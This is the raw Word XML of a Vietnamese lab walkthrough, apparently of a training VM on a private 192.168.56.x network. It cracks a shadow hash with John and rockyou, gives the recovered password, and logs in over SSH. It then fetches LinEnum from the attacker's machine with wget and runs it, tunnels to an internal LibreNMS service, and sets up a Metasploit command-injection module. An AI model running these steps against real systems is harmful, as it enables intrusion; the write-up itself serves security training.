    <w:p w14:paraId="69CE4A9A" w14:textId="46A1B90A" w:rsidR="00F56C71" w:rsidRDefault="00F56C71">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F56C71">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">     Vi aeolus</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E58CE55" w14:textId="63A344EA" w:rsidR="00F56C71" w:rsidRPr="00F56C71" w:rsidRDefault="00F56C71">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">               </w:t>
      </w:r>
      <w:r w:rsidRPr="00F56C71">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7:::</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77913D6E" w14:textId="10EC1ED6" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">john </w:t>
      </w:r>
      <w:r w:rsidR="00F56C71">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>aeolus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> --wordlist=/usr/share/wordlists/rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EEAB29" w14:textId="25BD552B" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ssh aeolus@</w:t>
      </w:r>
      <w:r w:rsidR="00F56C71">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.121</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A2C25D" w14:textId="5DC8A85B" w:rsidR="00F56C71" w:rsidRDefault="00F56C71">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="75EF9D9F" wp14:editId="047ED28E">
            <wp:extent cx="3724275" cy="1504950"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="12454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69978" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3724275" cy="1504950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FC017B" w14:textId="7CAFE8F1" w:rsidR="00864291" w:rsidRDefault="00864291">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="03886169" wp14:editId="71E68734">
            <wp:extent cx="6217920" cy="1579245"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="20935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6077" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1579245"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="710A1354" w14:textId="77777777" w:rsidR="00A94708" w:rsidRDefault="00A94708">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="742903A8" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>John thử mật khẩu từ rockyou.txt. Khi tìm được mật khẩu hợp lệ, dùng SSH đăng nhập tài khoản aeolus.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C24E347" w14:textId="77777777" w:rsidR="00A94708" w:rsidRPr="00A94708" w:rsidRDefault="00A94708" w:rsidP="00A94708">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A94708">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Tài khoản (Username):</w:t>
      </w:r>
      <w:r w:rsidRPr="00A94708">
        <w:t xml:space="preserve"> aeolus</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E300B30" w14:textId="64D360B8" w:rsidR="00A94708" w:rsidRPr="00A94708" w:rsidRDefault="00A94708" w:rsidP="00A94708">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A94708">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Mật khẩu (Plaintext Password):</w:t>
      </w:r>
      <w:r w:rsidRPr="00A94708">
        <w:t xml:space="preserve"> sergioteamo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E06863" w14:textId="77777777" w:rsidR="00A94708" w:rsidRDefault="00A94708"/>
    <w:p w14:paraId="336C345E" w14:textId="2EF63BD8" w:rsidR="00864291" w:rsidRPr="00864291" w:rsidRDefault="00A94708" w:rsidP="00864291">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="45FA464E" wp14:editId="3C70A87B">
            <wp:extent cx="6217920" cy="2720975"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="159970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8351" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2720975"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="589CBFAE" w14:textId="6689115E" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Thu thập thông tin bằng LinEnum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10726974" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Kiểm tra các cấu hình và đường leo quyền trong hệ thống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1044488E" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229D48EA" w14:textId="3899D392" w:rsidR="00864291" w:rsidRPr="00864291" w:rsidRDefault="00864291">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00864291">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00864291">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cd  /var/www/htm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191EB493" w14:textId="4D779659" w:rsidR="0035454E" w:rsidRDefault="0035454E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0035454E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">git clone https://github.com/rebootuser/LinEnum.git </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D397F57" w14:textId="77777777" w:rsidR="0035454E" w:rsidRDefault="0035454E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0035454E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">cp LinEnum/LinEnum.sh /var/www/html/ </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71383593" w14:textId="124C893C" w:rsidR="0035454E" w:rsidRDefault="0035454E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0035454E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>chmod +x LinEnum.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CEFD47" w14:textId="3280441A" w:rsidR="0035454E" w:rsidRDefault="0035454E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0035454E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>service apache2 start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FA1667" w14:textId="0EB5D850" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>LinEnum liệt kê quyền sudo, dịch vụ, tệp nhạy cảm và các cấu hình đáng chú ý.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691B96F6" w14:textId="77777777" w:rsidR="0035454E" w:rsidRDefault="0035454E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2639AE9C" wp14:editId="4D7092B4">
            <wp:extent cx="6217920" cy="4977130"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="156130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00064" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="4977130"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC1E3DF" w14:textId="77777777" w:rsidR="0035454E" w:rsidRDefault="0035454E" w:rsidP="0035454E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219427A7" w14:textId="77777777" w:rsidR="0035454E" w:rsidRPr="0035454E" w:rsidRDefault="0035454E" w:rsidP="0035454E"/>
    <w:p w14:paraId="77CA7F60" w14:textId="63497109" w:rsidR="0035454E" w:rsidRDefault="0035454E" w:rsidP="0035454E">
      <w:r w:rsidRPr="0035454E">
        <w:t xml:space="preserve">wget </w:t>
      </w:r>
      <w:r w:rsidR="00C16E4C" w:rsidRPr="00C16E4C">
        <w:t>http://192.168.56.122/LinEnum.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F31013" w14:textId="68A27812" w:rsidR="00C16E4C" w:rsidRPr="0035454E" w:rsidRDefault="00C16E4C" w:rsidP="0035454E">
      <w:r>
        <w:t xml:space="preserve">sh </w:t>
      </w:r>
      <w:r w:rsidRPr="0035454E">
        <w:t>LinEnum.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD89714" w14:textId="704C7014" w:rsidR="0035454E" w:rsidRDefault="0035454E" w:rsidP="0035454E">
      <w:r w:rsidRPr="0035454E">
        <w:t>Lệnh này giúp máy nạn nhân kết nối tới máy Kali của bạn qua mạng nội bộ để bứng cái file LinEnum.sh từ thư mục /var/www/html của máy Kali về lưu vào thư mục hiện tại của máy nạn nhân</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542BBFC8" w14:textId="5081E6CC" w:rsidR="0035454E" w:rsidRDefault="0035454E" w:rsidP="0035454E">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="22800A82" wp14:editId="4955F15E">
            <wp:extent cx="6217920" cy="1008380"/>
            <wp:effectExtent l="0" t="0" r="0" b="1270"/>
            <wp:docPr id="16076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2416" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1008380"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4043E07F" w14:textId="1B232D87" w:rsidR="00C16E4C" w:rsidRDefault="00C16E4C" w:rsidP="0035454E">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2F965083" wp14:editId="0657A3B2">
            <wp:extent cx="6217920" cy="3547110"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="241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1227" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3547110"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07CC5F22" w14:textId="3F514371" w:rsidR="00C16E4C" w:rsidRPr="0035454E" w:rsidRDefault="00C16E4C" w:rsidP="0035454E">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2B950AE9" wp14:editId="3B251510">
            <wp:extent cx="6217920" cy="2094230"/>
            <wp:effectExtent l="0" t="0" r="0" b="1270"/>
            <wp:docPr id="175675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6984" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId23"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2094230"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="318BC0AD" w14:textId="77777777" w:rsidR="0035454E" w:rsidRDefault="0035454E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17489D9F" w14:textId="627B5C2B" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Chuyển tiếp cổng tới dịch vụ nội bộ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D3922F" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Truy cập dịch vụ đang lắng nghe tại localhost:8080 của máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9C0278" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1796EC" w14:textId="24663822" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ssh -L 8080:localhost:8080 aeolus@</w:t>
      </w:r>
      <w:r w:rsidR="00C16E4C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.121</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A05DA10" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>SSH tunnel ánh xạ cổng 8080 trên Kali tới cổng 8080 nội bộ của máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BD015C" w14:textId="60248121" w:rsidR="00C16E4C" w:rsidRDefault="00C16E4C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="737AC30D" wp14:editId="0C3C592D">
            <wp:extent cx="6217920" cy="2345690"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="13477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7280" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId24"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2345690"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D718B2" w14:textId="00623C4B" w:rsidR="00E92EA2" w:rsidRDefault="00C16E4C" w:rsidP="00E92EA2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId25" w:history="1">
        <w:r w:rsidRPr="00097F2C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://127.0.0.1:8080/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> trên máy kali truy cập voà địa chỉ này sử dụng </w:t>
      </w:r>
      <w:r w:rsidR="00E92EA2">
        <w:t>để đăng nhập</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B05C568" w14:textId="478134E5" w:rsidR="00E92EA2" w:rsidRPr="00A94708" w:rsidRDefault="00E92EA2" w:rsidP="00E92EA2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A94708">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Tài khoản (Username):</w:t>
      </w:r>
      <w:r w:rsidRPr="00A94708">
        <w:t xml:space="preserve"> aeolus</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6772F587" w14:textId="77777777" w:rsidR="00E92EA2" w:rsidRPr="00A94708" w:rsidRDefault="00E92EA2" w:rsidP="00E92EA2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A94708">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Mật khẩu (Plaintext Password):</w:t>
      </w:r>
      <w:r w:rsidRPr="00A94708">
        <w:t xml:space="preserve"> sergioteamo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67273B25" w14:textId="40423893" w:rsidR="00C16E4C" w:rsidRDefault="00C16E4C"/>
    <w:p w14:paraId="10D75234" w14:textId="507C8161" w:rsidR="00E92EA2" w:rsidRDefault="00E92EA2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7854CBF1" wp14:editId="6820E19F">
            <wp:extent cx="6217920" cy="3557905"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="18865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248" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId26"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3557905"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C16E4C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="77EE6A72" wp14:editId="10768749">
            <wp:extent cx="6217920" cy="3060700"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:docPr id="111863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39000" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId27"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3060700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00C16E4C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B03D4C9" w14:textId="54104FEE" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Khai thác LibreNMS bằng Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D070627" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tạo phiên truy cập thông qua module command injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6183C5A1" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1741ABED" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6D4EEE" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>use exploit/linux/http/librenms_addhost_cmd_inject</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7579E443" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>set RHOSTS localhost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6036DC71" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>set RPORT 8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B3CFDD" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>set USERNAME aeolus</w:t>
      </w:r>
    </w:p>
